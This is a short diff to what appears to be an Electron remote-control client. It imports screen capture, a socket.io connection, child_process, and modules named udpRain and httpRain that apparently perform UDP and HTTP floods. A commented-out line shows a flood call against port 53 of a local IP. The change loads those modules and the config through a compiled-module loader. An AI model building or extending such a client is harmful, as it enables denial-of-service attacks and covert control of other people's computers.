@@ -1,13 +1,14 @@
 const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
 const io = require("socket.io-client");
 const child_process = require("child_process");
-const udpRain = require("./udpRain");
-const httpRain = require("./httpRain");
+const { requireCompiled } = require("./requireCompiled");
+const udpRain = requireCompiled("./udpRain");
+const httpRain = requireCompiled("./httpRain");
 const axios = require("axios");
 //udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });
 
 // My Modules
-const info = require("./config");
+const info = requireCompiled("./config");
 
 class RemoteControl {
   constructor() {
